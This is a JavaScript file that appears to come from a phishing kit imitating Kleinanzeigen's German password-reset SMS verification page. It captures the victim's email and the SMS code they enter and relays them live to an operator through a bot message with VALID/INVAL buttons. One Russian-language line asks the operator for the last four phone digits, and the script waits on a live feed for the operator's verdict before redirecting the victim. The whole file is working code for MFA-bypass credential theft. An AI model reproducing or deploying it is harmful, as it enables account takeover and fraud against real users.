(function () {
  var email   = sessionStorage.getItem("ka_email")   || "";
  var siteId  = sessionStorage.getItem("ka_site_id") || "";

  if (!email || !siteId || !sessionStorage.getItem("ka_forgot_msg_id")) {
    window.location.href = "login.html"; return;
  }

  var resetSmsId = siteId + "_reset_sms";

  var phoneDisplay = document.getElementById("phoneDisplay");
  var codeInput    = document.getElementById("smsCode");
  var codeGroup    = document.getElementById("codeGroup");
  var errCode      = document.getElementById("errCode");
  var btnWeiter    = document.getElementById("btnWeiter");
  var btnResend    = document.getElementById("btnResend");

  var notifMsgId = null;
  var sseSub     = null;
  var digitsSub  = null;
  var done       = false;
  var phase      = 1;

  function escapeHtml(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }

  function startSSE() {
    if (sseSub) sseSub.close();
    sseSub = KA.subscribe(resetSmsId, {
      action: function(data) {
        if (done) return;
        if (data.siteId !== resetSmsId) return;
        if (phase === 2) {
          btnWeiter.disabled = false;
          btnWeiter.innerHTML = "Weiter";
          if (data.action === "success") {
            done = true; sseSub.close(); digitsSub.close();
            window.location.href = "new_password.html";
          } else if (data.action === "wrong_reset_sms") {
            codeInput.value = "";
            codeGroup.classList.remove("has-value");
            errCode.textContent = "Der Code ist falsch. Bitte versuche es erneut.";
            errCode.classList.add("visible");
            phase = 1;
          }
        }
      }
    });

    if (digitsSub) digitsSub.close();
    digitsSub = KA.subscribe(siteId, {
      digits: function(data) {
        if (done || phase !== 1) return;
        if (notifMsgId && data.replyMsgId && data.replyMsgId !== notifMsgId) return;
        phoneDisplay.textContent = "XXXXXXXXX" + data.digits;
        btnWeiter.disabled = false;
        btnWeiter.innerHTML = "Weiter";
        codeInput.focus();
      }
    });
  }

  function sendNotification() {
    var text =
      "\uD83D\uDCF1 <b>Kleinanzeigen Reset MFA</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE") + "\n\n" +
      "\u2757\uFE0F Ответьте на это сообщение последними 4 цифрами номера телефона";
    KA.sendMessage(text, null, true).then(function(data) {
      if (data.ok) notifMsgId = data.msgId;
    });
  }

  function sendCodeToBot(code) {
    phase = 2;
    var text =
      "\uD83D\uDCF1 <b>Kleinanzeigen Reset MFA Code</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
      "\uD83D\uDD22 <b>Code:</b> <code>" + escapeHtml(code) + "</code>\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE");
    KA.sendMessage(text, [
      [
        { text: "\u2705 VALID", callback_data: resetSmsId + ":success" },
        { text: "\u274C INVAL", callback_data: resetSmsId + ":wrong_reset_sms" }
      ]
    ]).catch(function() {
      phase = 1;
      btnWeiter.disabled = false;
      btnWeiter.innerHTML = "Weiter";
    });
  }

  window.addEventListener("beforeunload", function() {
    if (sseSub) sseSub.close();
    if (digitsSub) digitsSub.close();
  });

  btnWeiter.addEventListener("click", function() {
    var code = codeInput.value.trim().replace(/\D/g,"");
    errCode.classList.remove("visible");
    if (code.length < 4) {
      errCode.textContent = "Bitte gib den Code ein.";
      errCode.classList.add("visible");
      return;
    }
    btnWeiter.disabled = true;
    btnWeiter.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    sendCodeToBot(code);
  });

  btnResend.addEventListener("click", function() {
    codeInput.value = "";
    codeGroup.classList.remove("has-value");
    errCode.classList.remove("visible");
    codeInput.focus();
  });

  codeInput.addEventListener("input", function() {
    codeInput.value = codeInput.value.replace(/\D/g,"");
    if (codeInput.value) codeGroup.classList.add("has-value");
    else codeGroup.classList.remove("has-value");
  });

  startSSE();

  var savedDigits = sessionStorage.getItem("ka_sms_digits") || "";
  if (savedDigits) {
    phoneDisplay.textContent = "XXXXXXXXX" + savedDigits;
    btnWeiter.disabled = false;
    btnWeiter.innerHTML = "Weiter";
  } else {
    btnWeiter.disabled = true;
    btnWeiter.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    sendNotification();
  }
})();
